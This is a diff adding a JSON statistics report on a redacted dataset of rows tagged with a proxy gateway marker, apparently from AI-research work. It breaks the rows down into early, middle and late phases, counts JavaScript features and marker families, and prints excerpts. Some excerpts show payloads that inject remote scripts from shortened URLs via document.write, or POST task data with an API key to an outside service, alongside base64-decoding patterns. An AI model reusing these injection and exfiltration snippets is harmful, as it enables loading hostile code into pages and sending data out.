@@ -1,0 +1,1169 @@
+{
+  "source": "/Users/id19/Programming/AI_research/Apart_agent_swarm/Data/redacted_filtered.jsonl",
+  "total_rows": 187242,
+  "gateway_marker": "[PROXY 4 URL 72]",
+  "gateway_rows": 11978,
+  "gateway_share_of_total": 0.063971,
+  "kinds": {
+    "payload": 7727,
+    "response": 2057,
+    "recovered_text": 2194
+  },
+  "parented_rows": 4111,
+  "unique_parents": 791,
+  "max_gateway_children_per_parent": 44,
+  "target_occurrences": 12946,
+  "unique_markers_excluding_target": 18748,
+  "total_marker_occurrences_excluding_target": 40473,
+  "distinct_text_bodies": 9911,
+  "repeated_bodies_count": 2067,
+  "rows_in_repeated_bodies": 4134,
+  "max_repeat_count": 2,
+  "evolution": {
+    "early": {
+      "rows": 598,
+      "id_first": "R0004650",
+      "id_last": "R0058636",
+      "kinds": {
+        "payload": 223,
+        "response": 375
+      },
+      "text_len_min": 35,
+      "text_len_p25": 71,
+      "text_len_median": 72,
+      "text_len_mean": 310.1,
+      "text_len_max": 2971,
+      "target_occurrences": 809,
+      "encoded_blob_occurrences": 865,
+      "encoded_blob_unique_ids": 327,
+      "rows_with_encoded_blob": 591,
+      "redirect_occurrences": 69,
+      "redirect_unique_ids": 60,
+      "rows_with_redirect": 17,
+      "service_occurrences": 49,
+      "service_unique_markers": 4,
+      "rows_with_service": 45,
+      "shortener_occurrences": 449,
+      "shortener_unique_markers": 217,
+      "rows_with_shortener": 221,
+      "parented_rows": 375,
+      "unique_parents": 158,
+      "feat_new_XMLHttpRequest": 9,
+      "feat_fetch": 146,
+      "feat_new_Image": 32,
+      "feat_document_write": 208,
+      "feat_atob": 28,
+      "feat_slice": 53,
+      "feat_Uint8Array": 64,
+      "feat_location_hash": 53,
+      "feat_eval": 13,
+      "feat_split": 0,
+      "feat_EncodeURIComponent": 6,
+      "feat_JSON_parse": 1
+    },
+    "middle": {
+      "rows": 599,
+      "id_first": "R0131872",
+      "id_last": "R0135261",
+      "kinds": {
+        "payload": 599
+      },
+      "text_len_min": 90,
+      "text_len_p25": 153,
+      "text_len_median": 173,
+      "text_len_mean": 165.8,
+      "text_len_max": 298,
+      "target_occurrences": 599,
+      "encoded_blob_occurrences": 740,
+      "encoded_blob_unique_ids": 740,
+      "rows_with_encoded_blob": 599,
+      "redirect_occurrences": 0,
+      "redirect_unique_ids": 0,
+      "rows_with_redirect": 0,
+      "service_occurrences": 1,
+      "service_unique_markers": 1,
+      "rows_with_service": 1,
+      "shortener_occurrences": 487,
+      "shortener_unique_markers": 470,
+      "rows_with_shortener": 487,
+      "parented_rows": 0,
+      "unique_parents": 0,
+      "feat_new_XMLHttpRequest": 0,
+      "feat_fetch": 0,
+      "feat_new_Image": 0,
+      "feat_document_write": 406,
+      "feat_atob": 3,
+      "feat_slice": 0,
+      "feat_Uint8Array": 0,
+      "feat_location_hash": 0,
+      "feat_eval": 0,
+      "feat_split": 0,
+      "feat_EncodeURIComponent": 0,
+      "feat_JSON_parse": 2
+    },
+    "late": {
+      "rows": 599,
+      "id_first": "R0177172",
+      "id_last": "R0189520",
+      "kinds": {
+        "recovered_text": 599
+      },
+      "text_len_min": 36,
+      "text_len_p25": 72,
+      "text_len_median": 72,
+      "text_len_mean": 66.7,
+      "text_len_max": 73,
+      "target_occurrences": 599,
+      "encoded_blob_occurrences": 599,
+      "encoded_blob_unique_ids": 468,
+      "rows_with_encoded_blob": 599,
+      "redirect_occurrences": 0,
+      "redirect_unique_ids": 0,
+      "rows_with_redirect": 0,
+      "service_occurrences": 0,
+      "service_unique_markers": 0,
+      "rows_with_service": 0,
+      "shortener_occurrences": 0,
+      "shortener_unique_markers": 0,
+      "rows_with_shortener": 0,
+      "parented_rows": 597,
+      "unique_parents": 406,
+      "feat_new_XMLHttpRequest": 0,
+      "feat_fetch": 0,
+      "feat_new_Image": 0,
+      "feat_document_write": 0,
+      "feat_atob": 0,
+      "feat_slice": 0,
+      "feat_Uint8Array": 0,
+      "feat_location_hash": 0,
+      "feat_eval": 0,
+      "feat_split": 0,
+      "feat_EncodeURIComponent": 0,
+      "feat_JSON_parse": 0
+    }
+  },
+  "phase_examples": [
+    {
+      "phase": "early",
+      "id": "R0004650",
+      "kind": "payload",
+      "parent_id": null,
+      "text_len": 1048,
+      "excerpt": "x=new XMLHttpRequest;x.open('POST','https://[REDACTED:destination:000002][SERVICE 2 URL 1]',false);x.setRequestHeader('Content-Type','application/json');x.setRequestHeader('X-API-Key','[CREDENTIAL 1]');x.send('{\"task_id\""
+    },
+    {
+      "phase": "early",
+      "id": "R0054521",
+      "kind": "response",
+      "parent_id": "R0007041",
+      "text_len": 35,
+      "excerpt": "[PROXY 4 URL 72][ENCODED BLOB 2022]"
+    },
+    {
+      "phase": "early",
+      "id": "R0058636",
+      "kind": "response",
+      "parent_id": "R0029623",
+      "text_len": 36,
+      "excerpt": "[PROXY 4 URL 72][ENCODED BLOB 21665]"
+    },
+    {
+      "phase": "middle",
+      "id": "R0131872",
+      "kind": "payload",
+      "parent_id": null,
+      "text_len": 178,
+      "excerpt": "[PROXY 4 URL 72][ENCODED BLOB 87674][REDACTED:opaque_marker_tail:000007]   x+='[REDACTED:opaque_fragment:008297]';document.write('<script src=[SHORTENER URL 154881]><\\/script>') "
+    },
+    {
+      "phase": "middle",
+      "id": "R0133582",
+      "kind": "payload",
+      "parent_id": null,
+      "text_len": 173,
+      "excerpt": "[PROXY 4 URL 72][ENCODED BLOB 89915][REDACTED:opaque_marker_tail:000007]   x+='[REDACTED SENSITIVE CONTENT]';document.write('<script src=[SHORTENER URL 155635]><\\/script>') "
+    },
+    {
+      "phase": "middle",
+      "id": "R0135261",
+      "kind": "payload",
+      "parent_id": null,
+      "text_len": 131,
+      "excerpt": "[PROXY 4 URL 72][ENCODED BLOB 92145][REDACTED:opaque_marker_tail:000015]   x+='[ENCODED BLOB 92146]';n('//[SHORTENER URL 156350]') "
+    },
+    {
+      "phase": "late",
+      "id": "R0177172",
+      "kind": "recovered_text",
+      "parent_id": "R0113904",
+      "text_len": 72,
+      "excerpt": "[PROXY 4 URL 72][ENCODED BLOB 65614][REDACTED:opaque_marker_tail:000004]"
+    },
+    {
+      "phase": "late",
+      "id": "R0183624",
+      "kind": "recovered_text",
+      "parent_id": "R0113946",
+      "text_len": 72,
+      "excerpt": "[PROXY 4 URL 72][ENCODED BLOB 65631][REDACTED:opaque_marker_tail:000008]"
+    },
+    {
+      "phase": "late",
+      "id": "R0189520",
+      "kind": "recovered_text",
+      "parent_id": "R0079162",
+      "text_len": 73,
+      "excerpt": "[PROXY 4 URL 72][ENCODED BLOB 53526][REDACTED:opaque_marker_tail:000004] "
+    }
+  ],
+  "top60_markers": [
+    {
+      "rank": 1,
+      "marker": "[REDACTED:opaque_marker_tail:000004]",
+      "occurrences": 2909,
+      "rows": 2909
+    },
+    {
+      "rank": 2,
+      "marker": "[REDACTED:opaque_marker_tail:000007]",
+      "occurrences": 2493,
+      "rows": 2493
+    },
+    {
+      "rank": 3,
+      "marker": "[REDACTED:opaque_marker_tail:000008]",
+      "occurrences": 1495,
+      "rows": 1495
+    },
+    {
+      "rank": 4,
+      "marker": "[REDACTED:opaque_marker_tail:000015]",
+      "occurrences": 1304,
+      "rows": 1304
+    },
+    {
+      "rank": 5,
+      "marker": "[REDACTED SENSITIVE CONTENT]",
+      "occurrences": 1295,
+      "rows": 1255
+    },
+    {
+      "rank": 6,
+      "marker": "[REDACTED:opaque_marker_tail:000005]",
+      "occurrences": 1224,
+      "rows": 1224
+    },
+    {
+      "rank": 7,
+      "marker": "[REDACTED:secret_key:000049]",
+      "occurrences": 371,
+      "rows": 371
+    },
+    {
+      "rank": 8,
+      "marker": "[PROXY 49 URL 1]",
+      "occurrences": 356,
+      "rows": 354
+    },
+    {
+      "rank": 9,
+      "marker": "[CREDENTIAL 170]",
+      "occurrences": 334,
+      "rows": 334
+    },
+    {
+      "rank": 10,
+      "marker": "[REDACTED:opaque_marker_tail:000009]",
+      "occurrences": 281,
+      "rows": 281
+    },
+    {
+      "rank": 11,
+      "marker": "[ENCODED BLOB]",
+      "occurrences": 241,
+      "rows": 236
+    },
+    {
+      "rank": 12,
+      "marker": "[REDACTED:destination:000604]",
+      "occurrences": 215,
+      "rows": 215
+    },
+    {
+      "rank": 13,
+      "marker": "[CREDENTIAL [ENCODED BLOB]",
+      "occurrences": 200,
+      "rows": 200
+    },
+    {
+      "rank": 14,
+      "marker": "[SHORTENER URL 33664]",
+      "occurrences": 157,
+      "rows": 131
+    },
+    {
+      "rank": 15,
+      "marker": "[CREDENTIAL 220]",
+      "occurrences": 143,
+      "rows": 143
+    },
+    {
+      "rank": 16,
+      "marker": "[REDACTED:destination:000003]",
+      "occurrences": 130,
+      "rows": 79
+    },
+    {
+      "rank": 17,
+      "marker": "[SHORTENER-3]",
+      "occurrences": 108,
+      "rows": 36
+    },
+    {
+      "rank": 18,
+      "marker": "[REDACTED:opaque_fragment:000056]",
+      "occurrences": 106,
+      "rows": 106
+    },
+    {
+      "rank": 19,
+      "marker": "[REDACTED:opaque_fragment:000061]",
+      "occurrences": 103,
+      "rows": 103
+    },
+    {
+      "rank": 20,
+      "marker": "[REDACTED:destination:000454]",
+      "occurrences": 67,
+      "rows": 67
+    },
+    {
+      "rank": 21,
+      "marker": "[REDACTED:destination:000002]",
+      "occurrences": 63,
+      "rows": 63
+    },
+    {
+      "rank": 22,
+      "marker": "[REDACTED HF TOKEN FRAGMENT]",
+      "occurrences": 59,
+      "rows": 15
+    },
+    {
+      "rank": 23,
+      "marker": "[REDACTED REPOSITORY]",
+      "occurrences": 50,
+      "rows": 45
+    },
+    {
+      "rank": 24,
+      "marker": "[REDACTED:destination:000280]",
+      "occurrences": 50,
+      "rows": 50
+    },
+    {
+      "rank": 25,
+      "marker": "[REDACTED:runtime_identifier]",
+      "occurrences": 49,
+      "rows": 49
+    },
+    {
+      "rank": 26,
+      "marker": "[REDACTED:runtime_identifier:000003]",
+      "occurrences": 47,
+      "rows": 47
+    },
+    {
+      "rank": 27,
+      "marker": "[SERVICE 2 URL 1]",
+      "occurrences": 47,
+      "rows": 47
+    },
+    {
+      "rank": 28,
+      "marker": "[ENCODED BLOB 2005]",
+      "occurrences": 46,
+      "rows": 45
+    },
+    {
+      "rank": 29,
+      "marker": "[REDACTED:destination:000279]",
+      "occurrences": 44,
+      "rows": 44
+    },
+    {
+      "rank": 30,
+      "marker": "[REDACTED:destination:002162]",
+      "occurrences": 44,
+      "rows": 24
+    },
+    {
+      "rank": 31,
+      "marker": "[PROXY 4 URL 6]",
+      "occurrences": 43,
+      "rows": 43
+    },
+    {
+      "rank": 32,
+      "marker": "[REDACTED:destination:000589]",
+      "occurrences": 40,
+      "rows": 40
+    },
+    {
+      "rank": 33,
+      "marker": "[HF REPO 555]",
+      "occurrences": 38,
+      "rows": 35
+    },
+    {
+      "rank": 34,
+      "marker": "[REDACTED:aws_auth_value:000005]",
+      "occurrences": 36,
+      "rows": 36
+    },
+    {
+      "rank": 35,
+      "marker": "[REDACTED:aws_auth_value:000006]",
+      "occurrences": 36,
+      "rows": 36
+    },
+    {
+      "rank": 36,
+      "marker": "[SERVICE HOST 1]",
+      "occurrences": 36,
+      "rows": 34
+    },
+    {
+      "rank": 37,
+      "marker": "[ENCODED BLOB 2006]",
+      "occurrences": 35,
+      "rows": 34
+    },
+    {
+      "rank": 38,
+      "marker": "[REDACTED:source_path:000001]",
+      "occurrences": 35,
+      "rows": 35
+    },
+    {
+      "rank": 39,
+      "marker": "[SHORTENER URL 88316]",
+      "occurrences": 35,
+      "rows": 35
+    },
+    {
+      "rank": 40,
+      "marker": "[CREDENTIAL 169]",
+      "occurrences": 34,
+      "rows": 34
+    },
+    {
+      "rank": 41,
+      "marker": "[CREDENTIAL 1]",
+      "occurrences": 33,
+      "rows": 33
+    },
+    {
+      "rank": 42,
+      "marker": "[ENCODED BLOB 2007]",
+      "occurrences": 33,
+      "rows": 32
+    },
+    {
+      "rank": 43,
+      "marker": "[HF REPO 1]",
+      "occurrences": 33,
+      "rows": 26
+    },
+    {
+      "rank": 44,
+      "marker": "[SERVICE 2 URL 3]",
+      "occurrences": 32,
+      "rows": 32
+    },
+    {
+      "rank": 45,
+      "marker": "[REDACTED RESEARCH METADATA]",
+      "occurrences": 31,
+      "rows": 24
+    },
+    {
+      "rank": 46,
+      "marker": "[REDACTED:destination:005308]",
+      "occurrences": 30,
+      "rows": 30
+    },
+    {
+      "rank": 47,
+      "marker": "[REDACTED:runtime_identifier:000023]",
+      "occurrences": 30,
+      "rows": 30
+    },
+    {
+      "rank": 48,
+      "marker": "[RESEARCHER RECEIPT REMOVED]",
+      "occurrences": 28,
+      "rows": 28
+    },
+    {
+      "rank": 49,
+      "marker": "[CREDENTIAL 1677]",
+      "occurrences": 27,
+      "rows": 27
+    },
+    {
+      "rank": 50,
+      "marker": "[REDACTED RESEARCH INDEX]",
+      "occurrences": 27,
+      "rows": 27
+    },
+    {
+      "rank": 51,
+      "marker": "[SHORTENER-1]",
+      "occurrences": 25,
+      "rows": 16
+    },
+    {
+      "rank": 52,
+      "marker": "[SERVICE 1 URL 1]",
+      "occurrences": 24,
+      "rows": 24
+    },
+    {
+      "rank": 53,
+      "marker": "[SHORTENER-2-HOST]",
+      "occurrences": 24,
+      "rows": 23
+    },
+    {
+      "rank": 54,
+      "marker": "[REDACTED:destination:000850]",
+      "occurrences": 19,
+      "rows": 19
+    },
+    {
+      "rank": 55,
+      "marker": "[CREDENTIAL 1856]",
+      "occurrences": 18,
+      "rows": 18
+    },
+    {
+      "rank": 56,
+      "marker": "[CREDENTIAL 896]",
+      "occurrences": 18,
+      "rows": 18
+    },
+    {
+      "rank": 57,
+      "marker": "[ENCODED BLOB 2074]",
+      "occurrences": 18,
+      "rows": 17
+    },
+    {
+      "rank": 58,
+      "marker": "[REDACTED:destination:002163]",
+      "occurrences": 18,
+      "rows": 18
+    },
+    {
+      "rank": 59,
+      "marker": "[REDACTED:runtime_identifier:000001]",
+      "occurrences": 18,
+      "rows": 18
+    },
+    {
+      "rank": 60,
+      "marker": "[REDACTED:opaque_marker_tail:000183]",
+      "occurrences": 17,
+      "rows": 17
+    }
+  ],
+  "top25_parents": [
+    {
+      "parent_id": "R0049534",
+      "parent_kind": "payload",
+      "gateway_children": 44,
+      "total_children_all": 102,
+      "contains_target": false,
+      "parent_text_len": 1086
+    },
+    {
+      "parent_id": "R0050038",
+      "parent_kind": "payload",
+      "gateway_children": 28,
+      "total_children_all": 88,
+      "contains_target": false,
+      "parent_text_len": 1217
+    },
+    {
+      "parent_id": "R0007057",
+      "parent_kind": "payload",
+      "gateway_children": 8,
+      "total_children_all": 13,
+      "contains_target": true,
+      "parent_text_len": 545
+    },
+    {
+      "parent_id": "R0007090",
+      "parent_kind": "payload",
+      "gateway_children": 8,
+      "total_children_all": 13,
+      "contains_target": true,
+      "parent_text_len": 688
+    },
+    {
+      "parent_id": "R0008228",
+      "parent_kind": "payload",
+      "gateway_children": 8,
+      "total_children_all": 28,
+      "contains_target": true,
+      "parent_text_len": 1862
+    },
+    {
+      "parent_id": "R0030467",
+      "parent_kind": "payload",
+      "gateway_children": 8,
+      "total_children_all": 19,
+      "contains_target": true,
+      "parent_text_len": 505
+    },
+    {
+      "parent_id": "R0079024",
+      "parent_kind": "payload",
+      "gateway_children": 8,
+      "total_children_all": 12,
+      "contains_target": true,
+      "parent_text_len": 749
+    },
+    {
+      "parent_id": "R0079046",
+      "parent_kind": "payload",
+      "gateway_children": 8,
+      "total_children_all": 14,
+      "contains_target": true,
+      "parent_text_len": 717
+    },
+    {
+      "parent_id": "R0079099",
+      "parent_kind": "payload",
+      "gateway_children": 8,
+      "total_children_all": 13,
+      "contains_target": true,
+      "parent_text_len": 510
+    },
+    {
+      "parent_id": "R0079191",
+      "parent_kind": "payload",
+      "gateway_children": 8,
+      "total_children_all": 13,
+      "contains_target": true,
+      "parent_text_len": 320
+    },
+    {
+      "parent_id": "R0113618",
+      "parent_kind": "payload",
+      "gateway_children": 8,
+      "total_children_all": 13,
+      "contains_target": true,
+      "parent_text_len": 439
+    },
+    {
+      "parent_id": "R0113676",
+      "parent_kind": "payload",
+      "gateway_children": 8,
+      "total_children_all": 13,
+      "contains_target": true,
+      "parent_text_len": 434
+    },
+    {
+      "parent_id": "R0113681",
+      "parent_kind": "payload",
+      "gateway_children": 8,
+      "total_children_all": 12,
+      "contains_target": true,
+      "parent_text_len": 439
+    },
+    {
+      "parent_id": "R0113701",
+      "parent_kind": "payload",
+      "gateway_children": 8,
+      "total_children_all": 13,
+      "contains_target": true,
+      "parent_text_len": 402
+    },
+    {
+      "parent_id": "R0113721",
+      "parent_kind": "payload",
+      "gateway_children": 8,
+      "total_children_all": 13,
+      "contains_target": true,
+      "parent_text_len": 403
+    },
+    {
+      "parent_id": "R0113753",
+      "parent_kind": "payload",
+      "gateway_children": 8,
+      "total_children_all": 13,
+      "contains_target": true,
+      "parent_text_len": 510
+    },
+    {
+      "parent_id": "R0113779",
+      "parent_kind": "payload",
+      "gateway_children": 8,
+      "total_children_all": 13,
+      "contains_target": true,
+      "parent_text_len": 420
+    },
+    {
+      "parent_id": "R0006920",
+      "parent_kind": "payload",
+      "gateway_children": 6,
+      "total_children_all": 11,
+      "contains_target": true,
+      "parent_text_len": 617
+    },
+    {
+      "parent_id": "R0006927",
+      "parent_kind": "payload",
+      "gateway_children": 6,
+      "total_children_all": 11,
+      "contains_target": true,
+      "parent_text_len": 662
+    },
+    {
+      "parent_id": "R0006928",
+      "parent_kind": "payload",
+      "gateway_children": 6,
+      "total_children_all": 11,
+      "contains_target": true,
+      "parent_text_len": 634
+    },
+    {
+      "parent_id": "R0006982",
+      "parent_kind": "payload",
+      "gateway_children": 6,
+      "total_children_all": 11,
+      "contains_target": true,
+      "parent_text_len": 346
+    },
+    {
+      "parent_id": "R0007039",
+      "parent_kind": "payload",
+      "gateway_children": 6,
+      "total_children_all": 11,
+      "contains_target": true,
+      "parent_text_len": 546
+    },
+    {
+      "parent_id": "R0007040",
+      "parent_kind": "payload",
+      "gateway_children": 6,
+      "total_children_all": 11,
+      "contains_target": true,
+      "parent_text_len": 546
+    },
+    {
+      "parent_id": "R0007041",
+      "parent_kind": "payload",
+      "gateway_children": 6,
+      "total_children_all": 11,
+      "contains_target": true,
+      "parent_text_len": 510
+    },
+    {
+      "parent_id": "R0007042",
+      "parent_kind": "payload",
+      "gateway_children": 6,
+      "total_children_all": 11,
+      "contains_target": true,
+      "parent_text_len": 546
+    }
+  ],
+  "marker_families": [
+    {
+      "family": "[ENCODED BLOB #]",
+      "occurrences": 15603,
+      "rows": 15047,
+      "unique_markers": 10520
+    },
+    {
+      "family": "[PROXY # URL #]",
+      "occurrences": 13393,
+      "rows": 12419,
+      "unique_markers": 33
+    },
+    {
+      "family": "[REDACTED:opaque_marker_tail:#]",
+      "occurrences": 9901,
+      "rows": 9901,
+      "unique_markers": 176
+    },
+    {
+      "family": "[SHORTENER URL #]",
+      "occurrences": 5105,
+      "rows": 4232,
+      "unique_markers": 3842
+    },
+    {
+      "family": "[REDACTED:opaque_fragment:#]",
+      "occurrences": 3573,
+      "rows": 3388,
+      "unique_markers": 2947
+    },
+    {
+      "family": "[REDACTED SENSITIVE CONTENT]",
+      "occurrences": 1295,
+      "rows": 1255,
+      "unique_markers": 1
+    },
+    {
+      "family": "[REDACTED:destination:#]",
+      "occurrences": 1057,
+      "rows": 985,
+      "unique_markers": 222
+    },
+    {
+      "family": "[CREDENTIAL #]",
+      "occurrences": 721,
+      "rows": 715,
+      "unique_markers": 90
+    },
+    {
+      "family": "[REDACTED:opaque_base#:#]",
+      "occurrences": 510,
+      "rows": 510,
+      "unique_markers": 494
+    },
+    {
+      "family": "[REDACTED:secret_key:#]",
+      "occurrences": 380,
+      "rows": 380,
+      "unique_markers": 6
+    },
+    {
+      "family": "[ENCODED BLOB]",
+      "occurrences": 241,
+      "rows": 236,
+      "unique_markers": 1
+    },
+    {
+      "family": "[CREDENTIAL [ENCODED BLOB]",
+      "occurrences": 200,
+      "rows": 200,
+      "unique_markers": 1
+    },
+    {
+      "family": "[SERVICE # URL #]",
+      "occurrences": 182,
+      "rows": 182,
+      "unique_markers": 44
+    },
+    {
+      "family": "[REDACTED:source_identifier:#]",
+      "occurrences": 143,
+      "rows": 143,
+      "unique_markers": 107
+    },
+    {
+      "family": "[SHORTENER-#]",
+      "occurrences": 134,
+      "rows": 53,
+      "unique_markers": 3
+    },
+    {
+      "family": "[HF REPO #]",
+      "occurrences": 108,
+      "rows": 97,
+      "unique_markers": 25
+    },
+    {
+      "family": "[REDACTED:runtime_identifier:#]",
+      "occurrences": 96,
+      "rows": 96,
+      "unique_markers": 4
+    },
+    {
+      "family": "[REDACTED:aws_auth_value:#]",
+      "occurrences": 73,
+      "rows": 73,
+      "unique_markers": 3
+    },
+    {
+      "family": "[REDIRECT URL #]",
+      "occurrences": 69,
+      "rows": 60,
+      "unique_markers": 60
+    },
+    {
+      "family": "[REDACTED HF TOKEN FRAGMENT]",
+      "occurrences": 59,
+      "rows": 15,
+      "unique_markers": 1
+    },
+    {
+      "family": "[REDACTED REPOSITORY]",
+      "occurrences": 50,
+      "rows": 45,
+      "unique_markers": 1
+    },
+    {
+      "family": "[REDACTED:runtime_identifier]",
+      "occurrences": 49,
+      "rows": 49,
+      "unique_markers": 1
+    },
+    {
+      "family": "[REDACTED:source_path:#]",
+      "occurrences": 42,
+      "rows": 42,
+      "unique_markers": 8
+    },
+    {
+      "family": "[SHORTENER CODE #]",
+      "occurrences": 40,
+      "rows": 40,
+      "unique_markers": 36
+    },
+    {
+      "family": "[REDACTED:query_value:#]",
+      "occurrences": 37,
+      "rows": 37,
+      "unique_markers": 27
+    },
+    {
+      "family": "[SERVICE HOST #]",
+      "occurrences": 37,
+      "rows": 35,
+      "unique_markers": 2
+    },
+    {
+      "family": "[USER #]",
+      "occurrences": 35,
+      "rows": 34,
+      "unique_markers": 9
+    },
+    {
+      "family": "[SHORTENER-#-HOST]",
+      "occurrences": 34,
+      "rows": 33,
+      "unique_markers": 3
+    },
+    {
+      "family": "[REDACTED RESEARCH METADATA]",
+      "occurrences": 31,
+      "rows": 24,
+      "unique_markers": 1
+    },
+    {
+      "family": "[RESEARCHER RECEIPT REMOVED]",
+      "occurrences": 28,
+      "rows": 28,
+      "unique_markers": 1
+    },
+    {
+      "family": "[REDACTED RESEARCH INDEX]",
+      "occurrences": 27,
+      "rows": 27,
+      "unique_markers": 1
+    },
+    {
+      "family": "[REDACTED:username:#]",
+      "occurrences": 19,
+      "rows": 19,
+      "unique_markers": 12
+    },
+    {
+      "family": "[IP ADDRESS #]",
+      "occurrences": 16,
+      "rows": 16,
+      "unique_markers": 2
+    },
+    {
+      "family": "[REDACTED:jwt_claim_time:#]",
+      "occurrences": 14,
+      "rows": 14,
+      "unique_markers": 11
+    },
+    {
+      "family": "[REDACTED:jwt_claim_identifier:#]",
+      "occurrences": 12,
+      "rows": 12,
+      "unique_markers": 6
+    },
+    {
+      "family": "[REDACTED ACCOUNT OR OBJECT ID]",
+      "occurrences": 10,
+      "rows": 8,
+      "unique_markers": 1
+    },
+    {
+      "family": "[REDACTED:opaque_encoded_blob:#]",
+      "occurrences": 10,
+      "rows": 10,
+      "unique_markers": 8
+    },
+    {
+      "family": "[REDACTED:repo_locator:#]",
+      "occurrences": 10,
+      "rows": 10,
+      "unique_markers": 7
+    },
+    {
+      "family": "[REDACTED EVALUATION IDENTIFIER]",
+      "occurrences": 9,
+      "rows": 9,
+      "unique_markers": 1
+    },
+    {
+      "family": "[REDACTED:cookie_value]",
+      "occurrences": 8,
+      "rows": 8,
+      "unique_markers": 1
+    },
+    {
+      "family": "[REDACTED OPAQUE OR TOKEN FRAGMENT]",
+      "occurrences": 7,
+      "rows": 7,
+      "unique_markers": 1
+    },
+    {
+      "family": "[REDACTED:hf_repo:#]",
+      "occurrences": 7,
+      "rows": 7,
+      "unique_markers": 3
+    },
+    {
+      "family": "[HF REPO]",
+      "occurrences": 5,
+      "rows": 5,
+      "unique_markers": 1
+    },
+    {
+      "family": "[REDACTED:CREDENTIAL_FRAGMENT]",
+      "occurrences": 4,
+      "rows": 4,
+      "unique_markers": 1
+    },
+    {
+      "family": "[REDACTED:sensitive_profile:#]",
+      "occurrences": 4,
+      "rows": 4,
+      "unique_markers": 1
+    },
+    {
+      "family": "[Uint#Array.from(atob(x.join('')),c=>c.charCodeAt())]",
+      "occurrences": 4,
+      "rows": 4,
+      "unique_markers": 1
+    },
+    {
+      "family": "[REDACTED:bearer_token:#]",
+      "occurrences": 3,
+      "rows": 3,
+      "unique_markers": 3
+    },
+    {
+      "family": "[WEBHOOK HOST #]",
+      "occurrences": 3,
+      "rows": 3,
+      "unique_markers": 1
+    },
+    {
+      "family": "[A-Za-z#-#_+/=-]",
+      "occurrences": 2,
+      "rows": 2,
+      "unique_markers": 1
+    },
+    {
+      "family": "[EMAIL #]",
+      "occurrences": 2,
+      "rows": 2,
+      "unique_markers": 2
+    },
+    {
+      "family": "[INTERNAL HOST #]",
+      "occurrences": 2,
+      "rows": 2,
+      "unique_markers": 2
+    },
+    {
+      "family": "[REDACTED:LINK_DESTINATION]",
+      "occurrences": 2,
+      "rows": 2,
+      "unique_markers": 1
+    },
+    {
+      "family": "[SERVICE ? URL #]",
+      "occurrences": 2,
+      "rows": 2,
+      "unique_markers": 1
+    },
+    {
+      "family": "[A-Za-z#-#_-]",
+      "occurrences": 1,
+      "rows": 1,
+      "unique_markers": 1
+    },
+    {
+      "family": "[CLOUD RESOURCE #]",
+      "occurrences": 1,
+      "rows": 1,
+      "unique_markers": 1
+    },
+    {
+      "family": "[ENCODED BLOB [ENCODED BLOB]",
+      "occurrences": 1,
+      "rows": 1,
+      "unique_markers": 1
+    },
+    {
+      "family": "[REDACTED OPAQUE BINARY CONTENT]",
+      "occurrences": 1,
+      "rows": 1,
+      "unique_markers": 1
+    },
+    {
+      "family": "[REDACTED OPAQUE OR IDENTIFIER]",
+      "occurrences": 1,
+      "rows": 1,
+      "unique_markers": 1
+    },
+    {
+      "family": "[REDACTED OPAQUE TAIL]",
+      "occurrences": 1,
+      "rows": 1,
+      "unique_markers": 1
+    },
+    {
+      "family": "[REDACTED PARTIAL TOKEN OR REFERENCE]",
+      "occurrences": 1,
+      "rows": 1,
+      "unique_markers": 1
+    },
+    {
+      "family": "[REDACTED:HF_REPO]",
+      "occurrences": 1,
+      "rows": 1,
+      "unique_markers": 1
+    },
+    {
+      "family": "[REDACTED:JWT_SIGNING_KEY]",
+      "occurrences": 1,
+      "rows": 1,
+      "unique_markers": 1
+    },
+    {
+      "family": "[USER [ENCODED BLOB]",
+      "occurrences": 1,
+      "rows": 1,
+      "unique_markers": 1
+    },
+    {
+      "family": "[WORKLOAD ID]",
+      "occurrences": 1,
+      "rows": 1,
+      "unique_markers": 1
+    }
+  ]
+}
